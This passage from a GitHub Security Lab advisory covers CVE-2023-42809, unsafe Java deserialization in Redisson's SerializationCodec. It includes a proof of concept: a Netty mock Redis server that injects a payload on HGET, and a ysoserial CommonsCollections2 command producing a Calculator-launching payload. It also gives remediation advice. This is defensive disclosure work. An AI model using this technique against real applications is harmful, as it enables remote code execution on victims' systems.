<p>As it can be seen, the input buffer is finally used in <code class="language-plaintext highlighter-rouge">ObjectInputStream.readObject</code>, which triggers the unsafe deserialization. Note that <code class="language-plaintext highlighter-rouge">CustomObjectInputStream</code> is a thin wrapper over <code class="language-plaintext highlighter-rouge">ObjectInputStream</code>, and even though it seems to make decisions based on the to-be-deserialized class, actually it just delegates to the default implementation if the class can’t be found in the current class loader:</p>

<p><a href="https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java#L41"><code class="language-plaintext highlighter-rouge">redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java:41</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="nc">ObjectStreamClass</span> <span class="n">desc</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
        <span class="k">return</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="n">classLoader</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to remote code execution.</p>

<h4 id="resources">Resources</h4>

<p>To exploit this vulnerability, a malicious Redis server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client.</p>

<p>To be able to easily reproduce this, we used the following simplified example:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">App</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Config</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Config</span><span class="o">();</span>
        <span class="n">config</span><span class="o">.</span><span class="na">useSingleServer</span><span class="o">().</span><span class="na">setAddress</span><span class="o">(</span><span class="s">"redis://127.0.0.1:3000"</span><span class="o">);</span>
        <span class="n">config</span><span class="o">.</span><span class="na">setCodec</span><span class="o">(</span><span class="k">new</span> <span class="nc">SerializationCodec</span><span class="o">());</span>
        <span class="nc">RedissonClient</span> <span class="n">redisson</span> <span class="o">=</span> <span class="nc">Redisson</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
        <span class="nc">RMap</span><span class="o">&lt;?,</span> <span class="o">?&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="n">redisson</span><span class="o">.</span><span class="na">getMap</span><span class="o">(</span><span class="s">"myMap"</span><span class="o">);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"test"</span><span class="o">);</span>
        <span class="n">redisson</span><span class="o">.</span><span class="na">shutdown</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>The example points to localhost’s port 3000, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Redis server and returns them to the client, until the <code class="language-plaintext highlighter-rouge">HGET</code> command happens. Then, our server injects the malicious response:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AttackChannelHandler</span> <span class="kd">extends</span> <span class="nc">SimpleChannelInboundHandler</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="o">{</span>

    <span class="nd">@Override</span>
    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">channelRead0</span><span class="o">(</span><span class="nc">ChannelHandlerContext</span> <span class="n">ctx</span><span class="o">,</span> <span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="c1">// --snip--</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"PING"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">ctx</span><span class="o">.</span><span class="na">channel</span><span class="o">().</span><span class="na">writeAndFlush</span><span class="o">(</span>
                    <span class="k">new</span> <span class="nf">RawByteMessage</span><span class="o">(</span><span class="k">new</span> <span class="kt">int</span><span class="o">[]</span> <span class="o">{</span><span class="sc">'+'</span><span class="o">,</span> <span class="sc">'P'</span><span class="o">,</span> <span class="sc">'O'</span><span class="o">,</span> <span class="sc">'N'</span><span class="o">,</span> <span class="sc">'G'</span><span class="o">,</span> <span class="sc">'\r'</span><span class="o">,</span> <span class="sc">'\n'</span><span class="o">}));</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"HGET"</span><span class="o">))</span> <span class="o">{</span>
            <span class="c1">// Load the deserialization payload from disk</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">payload</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"payload.bin"</span><span class="o">));</span>
            <span class="kt">long</span> <span class="n">l</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
            <span class="nc">String</span> <span class="n">length</span> <span class="o">=</span> <span class="nc">Long</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">l</span><span class="o">);</span>
            <span class="c1">// Message format is $ + length + crlf + payload + clrf</span>
            <span class="kt">int</span><span class="o">[]</span> <span class="n">message</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">1</span> <span class="o">+</span> <span class="n">length</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">2</span><span class="o">];</span>
            <span class="c1">// Add the $ character to trigger the deserialization</span>
            <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
            <span class="n">message</span><span class="o">[</span><span class="n">offset</span><span class="o">++]</span> <span class="o">=</span> <span class="sc">'$'</span><span class="o">;</span>
            <span class="c1">// Add length as base 10 bytes</span>
            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="n">message</span><span class="o">[</span><span class="n">offset</span><span class="o">++]</span> <span class="o">=</span> <span class="n">length</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="c1">// CRLF</span>
            <span class="n">message</span><span class="o">[</span><span class="n">offset</span><span class="o">++]</span> <span class="o">=</span> <span class="mh">0x0d</span><span class="o">;</span>
            <span class="n">message</span><span class="o">[</span><span class="n">offset</span><span class="o">++]</span> <span class="o">=</span> <span class="mh">0x0a</span><span class="o">;</span>
            <span class="c1">// Add payload bytes</span>
            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">payload</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="n">message</span><span class="o">[</span><span class="n">offset</span><span class="o">++]</span> <span class="o">=</span> <span class="n">payload</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
            <span class="o">}</span>
            <span class="c1">// CRLF</span>
            <span class="n">message</span><span class="o">[</span><span class="n">offset</span><span class="o">++]</span> <span class="o">=</span> <span class="mh">0x0d</span><span class="o">;</span>
            <span class="n">message</span><span class="o">[</span><span class="n">offset</span><span class="o">++]</span> <span class="o">=</span> <span class="mh">0x0a</span><span class="o">;</span>
            <span class="n">ctx</span><span class="o">.</span><span class="na">channel</span><span class="o">().</span><span class="na">writeAndFlush</span><span class="o">(</span><span class="k">new</span> <span class="nc">RawByteMessage</span><span class="o">(</span><span class="n">message</span><span class="o">));</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">RawByteMessage</code> is a message class that just contains a byte array, which gets sent as-is by a Netty <code class="language-plaintext highlighter-rouge">MessageToByteEncoder&lt;RawByteMessage&gt;</code>.</p>

<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using Redisson. Again for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;dependency&gt;</span>
  <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>
  <span class="nt">&lt;artifactId&gt;</span>commons-collections4<span class="nt">&lt;/artifactId&gt;</span>
  <span class="nt">&lt;version&gt;</span>4.0<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
</code></pre></div></div>

<p>In which case, the malicious payload file could be generated using <a href="https://github.com/frohoff/ysoserial">ysoserial</a> as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin
</code></pre></div></div>

<h4 id="post-fix-advice">Post-fix advice</h4>

<ul>
  <li>Do NOT use <code class="language-plaintext highlighter-rouge">Kryo5Codec</code> as deserialization codec, as it is still vulnerable to arbitrary object deserialization due to the <code class="language-plaintext highlighter-rouge">setRegistrationRequired(false)</code> call. On the contrary, <code class="language-plaintext highlighter-rouge">KryoCodec</code> is safe to use.</li>
  <li>The fix applied to <code class="language-plaintext highlighter-rouge">SerializationCodec</code> only consists of adding an optional allowlist of class names, even though we recommended making this behavior the default. When instantiating <code class="language-plaintext highlighter-rouge">SerializationCodec</code> please use the <code class="language-plaintext highlighter-rouge">SerializationCodec(ClassLoader classLoader, Set&lt;String&gt; allowedClasses)</code> constructor to restrict the allowed classes for deserialization.</li>
</ul>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2023-42809</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by the GitHub CodeQL team members <a href="https://github.com/atorralba">@atorralba (Tony Torralba)</a> and <a href="https://github.com/joefarebrother">@joefarebrother (Joseph Farebrother)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2023-053</code> in any communication regarding this issue.</p>


    </main>
  </div>

  <div></div>


  <footer class="sc-dVhcbM cBEMHy footer">
  <div class="container-xl py-10">
    <div class="d-flex flex-wrap flex-lg-nowrap flex-md-nowrap ">
      <div class="col-12 col-lg-5 mb-5">
        <a
          href="https://github.com/"
          data-ga-click="Footer, go to home, text:home"
          class="octicon-text-white"
          aria-label="Go to GitHub homepage"
        >
          <svg
            height="30"
            class="octicon octicon-logo-github"
            viewBox="0 0 45 16"
            version="1.1"
            width="84"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 00-.146-.18zM42.23 9.84c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"
            ></path>
          </svg>
        </a>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Product</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://github.com/features"
              data-ga-click="Footer, go to features, text:features"
              class="link-item"
              >Features</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/security"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Security</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/team"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Team</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/enterprise"
              data-ga-click="Footer, go to enterprise, text:enterprise"
              class="link-item"
              >Enterprise</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/customer-stories?type=enterprise"
              data-ga-click="Footer, go to customer stories, text:customer stories"
              class="link-item"
              >Customer stories</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/readme"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >The ReadME Project</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/pricing"
              data-ga-click="Footer, go to pricing, text:pricing"
              class="link-item"
              >Pricing</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Resources</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/github/roadmap"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Roadmap</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com/devops/tools/compare/"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item text-nowrap"
              >Compare GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5  col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Platform</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://developer.github.com"
              data-ga-click="Footer, go to api, text:api"
              class="link-item"
              >Developer API</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://partner.github.com/"
              data-ga-click="Footer, go to partner, text:partner"
              class="link-item"
              >Partners</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://atom.io"
              data-ga-click="Footer, go to atom, text:atom"
              class="link-item"
              >Atom</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://electron.atom.io/"
              data-ga-click="Footer, go to electron, text:electron"
              class="link-item"
              >Electron</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://desktop.github.com/"
              data-ga-click="Footer, go to desktop, text:desktop"
              class="link-item"
              >GitHub Desktop</a
            >
          </li>
        </ul>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Support</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to help, text:docs"
              class="link-item"
              href="https://docs.github.com"
              >Docs</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.community"
              data-ga-click="Footer, go to community, text:community"
              class="link-item"
              >Community Forum</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://services.github.com/"
              data-ga-click="Footer, go to professional services, text:professional services"
              class="link-item"
              >Professional Services</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://skills.github.com/"
              data-ga-click="Footer, go to skills, text:skills"
              class="link-item"
              >GitHub Skills</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://githubstatus.com/"
              data-ga-click="Footer, go to status, text:status"
              class="link-item"
              >Status</a
            >
          </li>
          <li class="py-2">
            <a
              data-ga-click="Footer, go to contact, text:contact"
              class="link-item"
              href="https://support.github.com"
              >Contact GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Company</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to about, text:about"
              class="link-item"
              href="https://github.com/about"
              >About</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.blog"
              data-ga-click="Footer, go to blog, text:blog"
              class="link-item"
              >Blog</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Careers</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Press</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Inclusion</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Social Impact</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://shop.github.com"
              data-ga-click="Footer, go to shop, text:shop"
              class="link-item"
              >Shop</a
            >
          </li>
        </ul>
      </div>
    </div>
  </div>
  <div class="bottom-banner">
    <div
      class="container-xl py-4 d-sm-flex flex-wrap flex-justify-between flex-row-reverse flex-items-center"
    >
      <ul
        class="list-style-none d-flex flex-wrap flex-items-center mb-3 mb-sm-0 social-icons"
      >
        <li class="mr-3">
          <a
            href="https://twitter.com/github"
            data-ga-click="Footer, go to Twitter, text:twitter"
            title="GitHub on Twitter"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 273.5 222.3"
              class="d-block"
              height="18"
            >
              <path
                d="M273.5 26.3a109.77 109.77 0 0 1-32.2 8.8 56.07 56.07 0 0 0 24.7-31 113.39 113.39 0 0 1-35.7 13.6 56.1 56.1 0 0 0-97 38.4 54 54 0 0 0 1.5 12.8A159.68 159.68 0 0 1 19.1 10.3a56.12 56.12 0 0 0 17.4 74.9 56.06 56.06 0 0 1-25.4-7v.7a56.11 56.11 0 0 0 45 55 55.65 55.65 0 0 1-14.8 2 62.39 62.39 0 0 1-10.6-1 56.24 56.24 0 0 0 52.4 39 112.87 112.87 0 0 1-69.7 24 119 119 0 0 1-13.4-.8 158.83 158.83 0 0 0 86 25.2c103.2 0 159.6-85.5 159.6-159.6 0-2.4-.1-4.9-.2-7.3a114.25 114.25 0 0 0 28.1-29.1"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.facebook.com/GitHub"
            data-ga-click="Footer, go to Facebook, text:facebook"
            title="GitHub on Facebook"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 15.3 15.4"
              class="d-block"
              height="18"
            >
              <path
                d="M14.5 0H.8a.88.88 0 0 0-.8.9v13.6a.88.88 0 0 0 .8.9h7.3v-6h-2V7.1h2V5.4a2.87 2.87 0 0 1 2.5-3.1h.5a10.87 10.87 0 0 1 1.8.1v2.1h-1.3c-1 0-1.1.5-1.1 1.1v1.5h2.3l-.3 2.3h-2v5.9h3.9a.88.88 0 0 0 .9-.8V.8a.86.86 0 0 0-.8-.8z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.youtube.com/github"
            data-ga-click="Footer, go to YouTube, text:youtube"
            title="GitHub on YouTube"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19.17 13.6"
              class="d-block"
              height="16"
            >
              <path
                d="M18.77 2.13A2.4 2.4 0 0 0 17.09.42C15.59 0 9.58 0 9.58 0a57.55 57.55 0 0 0-7.5.4A2.49 2.49 0 0 0 .39 2.13 26.27 26.27 0 0 0 0 6.8a26.15 26.15 0 0 0 .39 4.67 2.43 2.43 0 0 0 1.69 1.71c1.52.42 7.5.42 7.5.42a57.69 57.69 0 0 0 7.51-.4 2.4 2.4 0 0 0 1.68-1.71 25.63 25.63 0 0 0 .4-4.67 24 24 0 0 0-.4-4.69zM7.67 9.71V3.89l5 2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.linkedin.com/company/github"
            data-ga-click="Footer, go to Linkedin, text:linkedin"
            title="GitHub on Linkedin"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19 18"
              class="d-block"
              height="18"
            >
              <path
                d="M3.94 2A2 2 0 1 1 2 0a2 2 0 0 1 1.94 2zM4 5.48H0V18h4zm6.32 0H6.34V18h3.94v-6.57c0-3.66 4.77-4 4.77 0V18H19v-7.93c0-6.17-7.06-5.94-8.72-2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li>
          <a
            href="https://github.com/github"
            data-ga-click="Footer, go to github's org, text:github"
            title="GitHub's organization"
          >
            <svg
              height="20"
              class="octicon octicon-mark-github d-block"
              viewBox="0 0 16 16"
              version="1.1"
              width="20"
              aria-hidden="true"
            >
              <path
                fill-rule="evenodd"
                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
              ></path>
            </svg>
          </a>
        </li>
      </ul>
      <ul class="list-style-none d-flex flex-wrap bottom-links-text">
        <li class="mr-3">
          GitHub Inc. ©
          <!-- -->2024<!-- -->
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-terms-of-service"
            data-ga-click="Footer, go to terms, text:terms"
            class="link-gray"
            >Terms</a
          >
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-privacy-statement"
            data-ga-click="Footer, go to privacy, text:privacy"
            class="link-gray"
            >Privacy</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="#"
            data-ga-click="Footer, go to terms, text:sitemap"
            class="link-gray"
            >Sitemap</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="https://github.com/git-guides"
            data-ga-click="Footer, go to terms, text:what is git"
            class="link-gray"
            >What is Git?</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md"><a href="#" class="link-gray">Manage Cookies</a></li>
        <li class="mr-3 hide-sm hide-md">
          <a href="#" class="link-gray">Do not share my personal information</a>
        </li>
      </ul>
    </div>
  </div>
</footer>


  <!-- JAVASCRIPT -->
  <script src="/assets/js/main.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      if (document.body.classList.contains('page-blog')) {

      const eventFooter = document.querySelector('.event-footer');
      const mainFooter = document.querySelector('footer'); // Adjust this selector to match your footer element

      function checkFooterPosition() {
        const footerRect = mainFooter.getBoundingClientRect();
        const eventFooterRect = eventFooter.getBoundingClientRect();

        if (footerRect.top < window.innerHeight && footerRect.bottom >= 0) {
          eventFooter.style.position = 'relative';
          eventFooter.style.bottom = `0px`;
        } else {
          eventFooter.style.position = 'fixed';
          eventFooter.style.bottom = '0';
        }
      }

      window.addEventListener('scroll', checkFooterPosition);
      window.addEventListener('resize', checkFooterPosition);
      checkFooterPosition(); // Initial check
    }
    });
  </script>
</body>
</html>
